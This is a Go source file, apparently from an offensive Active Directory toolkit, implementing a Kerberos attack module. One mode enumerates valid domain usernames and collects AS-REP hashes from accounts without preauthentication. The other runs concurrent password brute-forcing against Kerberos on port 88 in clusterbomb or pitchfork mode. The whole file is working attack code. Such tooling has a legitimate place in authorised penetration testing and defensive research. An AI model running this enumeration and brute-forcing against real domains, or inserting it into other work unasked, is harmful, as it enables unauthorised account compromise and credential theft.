package optkrb5

import (
	"sync"

	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
	"github.com/5amu/goad/pkg/smb"
)

type Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
	} `group:"Connection Options" description:"Connection Options"`

	Mode struct {
		UserEnum bool `long:"user-enum" description:"enumerate valid usernames via kerberos"`
	} `group:"Attack Mode"`

	BruteforceStrategy struct {
		ClusterBomb bool `long:"clusterbomb" description:"payload sets in clusterbomb mode (default)"`
		Pitchfork   bool `long:"pitchfork" description:"payload sets in pitchfork mode"`
	} `group:"Bruteforce Strategy"`

	targets        []string
	target2SMBInfo map[string]*smb.SMBInfo
	printMutex     sync.Mutex
	credentials    []utils.Credential
}

func (o *Options) getFunction() func(string) {
	if o.Mode.UserEnum {
		return o.userenum
	}
	return o.bruteforce
}

func (o *Options) Run() {
	o.targets = utils.ExtractTargets(o.Targets.TARGETS)
	o.target2SMBInfo = utils.GatherSMBInfoToMap(o.targets, 88)
	var f func(string) = o.getFunction()

	var strategy utils.Strategy = utils.Clusterbomb
	if o.BruteforceStrategy.Pitchfork {
		strategy = utils.Pitchfork
	}
	o.credentials = utils.NewCredentialsDispacher(
		o.Connection.Username,
		o.Connection.Password,
		"",
		strategy,
	)

	var wg sync.WaitGroup
	for target := range o.target2SMBInfo {
		wg.Add(1)
		go func(t string) {
			f(t)
			wg.Done()
		}(target)
	}
	wg.Wait()
}

func (o *Options) userenum(target string) {
	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSName, 88)
	defer prt.PrintStored(&o.printMutex)

	client, err := NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	for _, u := range o.credentials {
		if tgs, err := client.GetAsReqTgt(u.Username); err != nil {
			_, ok := err.(*ErrorRequiresPreauth)
			if ok {
				prt.StoreSuccess(u.StringWithDomain(o.Connection.Domain), "Requires Preauth")
			} else {
				prt.StoreFailure(u.StringWithDomain(o.Connection.Domain), "Does Not Exist")
			}
		} else {
			hash := tgs.Hash
			prt.StoreSuccess(u.StringWithDomain(o.Connection.Domain), "No Preauth")
			prt.Store(hash)
		}
	}
}

func (o *Options) bruteforce(target string) {
	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSName, 88)
	defer prt.PrintStored(&o.printMutex)

	client, err := NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	for _, u := range o.credentials {
		if ok, _ := client.TestLogin(u.Username, u.Password); ok {
			prt.StoreSuccess(u.StringWithDomain(o.Connection.Domain))
		} else {
			prt.StoreFailure(u.StringWithDomain(o.Connection.Domain))
		}
	}
}
